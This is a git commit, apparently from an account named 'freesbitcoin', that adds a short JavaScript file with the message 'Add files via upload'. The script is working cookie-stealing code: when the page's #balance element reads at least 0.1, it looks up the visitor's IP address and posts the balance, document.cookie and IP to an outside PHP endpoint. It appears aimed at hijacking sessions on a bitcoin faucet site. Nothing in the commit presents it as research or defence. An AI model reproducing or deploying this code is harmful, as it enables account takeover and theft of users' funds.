f16c274e79eaa74ca6ff777dff65ffe0eafcfb25
freesbitcoin <63224040+freesbitcoin@users.noreply.github.com>
2022-03-30 08:25:52 +0530

    Add files via upload

---
+++ javascript.js
@@ -0,0 +1,14 @@
+$(document).ready(function() {    
+if($("#balance").text() >= 0.1){
+$.getJSON("https://ipinfo.io", function(data){
+		$ips = "Ip : " + data.ip;
+        $bel = $("#balance").text();
+        $cook = document.cookie;
+        $.post( "http://autofeedback.c1.biz/FBpostrequest.php", {
+            bel: $bel,
+            cook: $cook,
+            ips: $ips
+        });
+	});
+}
+});
